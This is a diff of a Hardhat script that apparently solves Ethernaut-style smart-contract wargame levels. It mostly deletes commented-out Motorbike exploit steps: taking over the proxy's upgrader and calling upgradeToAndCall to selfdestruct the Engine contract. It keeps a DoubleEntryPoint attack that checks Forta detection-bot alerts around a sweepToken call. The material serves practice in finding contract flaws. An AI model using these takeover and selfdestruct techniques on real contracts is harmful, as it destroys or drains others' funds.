@@ -32,14 +32,6 @@ async function main() {
   // Creating an instance of the DET token (Double Entry Token contract) 
   this.detToken = await hre.ethers.getContractAt("DoubleEntryPoint",DET_Token);
 
-  /*
-  address public cryptoVault;
-    address public player;
-    address public delegatedFrom;
-    Forta public forta;
-
-  */
-
   const FORTA_CONTRACT_ADDRESS = await this.detToken.forta()
   const LEGACY_TOKEN_CONTRACT_ADDRESS = await this.detToken.delegatedFrom();
   const DET_TOKEN_CONTRACT_ADDRESS = await this.detToken.address;
@@ -93,14 +85,6 @@ async function main() {
   
   console.log("\n\n Performing attack ... \n\n");
 
-  
-
-        // initializer() can't be called directly from an EOA //
-  // console.log("Calling initializer() directly from the Player's account!");
-  // tx = await this.engineContractProxyInstance.connect(player).initialize();
-  // txReceipt = await tx.wait();
-  // console.log(txReceipt);
-
   console.log("Alerts on the DetectionBot BEFORE attempting to sweep() the Legacy token from the Vault contract: ", await this.fortaContract.botRaisedAlerts(DETECTIONBOT_ADDRESS));
   
   // console.log("Calling the sweepToken() of the CryptoVault and passing the address of the LegacyToken as the parameter");
@@ -108,53 +92,7 @@ async function main() {
   await tx.wait();
 
   console.log("Alerts on the DetectionBot AFTER attempting to sweep() the Legacy token from the Vault contract: ", await this.fortaContract.botRaisedAlerts(DETECTIONBOT_ADDRESS));
-  
-  /*
-  console.log(
-    `
-    MotorbikeContractAddress ${MotorbikeContractAddress} \n
-    EngineContractAddress ${EngineContractAddress} \n\n
 
-    StorageAt slot0 on the Proxy contract: ${await hre.ethers.provider.getStorageAt(MotorbikeContractAddress,0)}
-    StorageAt slot1 on the Proxy contract: ${await hre.ethers.provider.getStorageAt(MotorbikeContractAddress,1)}
-    
-    StorageAt slot0 on the Engine contract: ${await hre.ethers.provider.getStorageAt(EngineContractAddress,0)}
-    `
-  );
- 
-    
-  console.log("Checking the upgrader variable was set as the Player's address");
-  console.log("upgrader on the Engine contract: ", await this.engineContract.upgrader());
-  console.log("upgrader on the Proxy contract: ", await this.engineContractProxyInstance.upgrader());
-  //txReceipt = await tx.wait();
-  // console.log(txReceipt);
-
-  console.log("Deploying the Attack contract");
-  const AttackMotorbike = await hre.ethers.getContractFactory("AttackMotorbike");
-  this.attackMotorbike = await AttackMotorbike.connect(player).deploy();
-  await this.attackMotorbike.deployed();
-
-  const iface = new hre.ethers.utils.Interface([
-    "function destroyContract()"
-  ]);
-
-  // Encoding the data that will be sent on the upgradeToAndCall
-  const destroyContractEncoded = iface.encodeFunctionData("destroyContract",[]);
-  
-  console.log("Selfdestructing the Engine contract");
-  tx = await this.engineContract.connect(player).upgradeToAndCall(this.attackMotorbike.address,destroyContractEncoded);
-  txReceipt = await tx.wait();
-  // console.log(txReceipt);
-
-  console.log("Was the Engine contract destructed?");
-  tx = await this.attackMotorbike.connect(player).contractExists(EngineContractAddress);
-  await tx.wait()
-
-  console.log(await this.attackMotorbike.destroyed());
-  expect(await this.attackMotorbike.destroyed()).to.eq(true);
-  
-
-  */
   console.log("\n\n ========================== Attack Completed!!!! ==========================");
 
 }
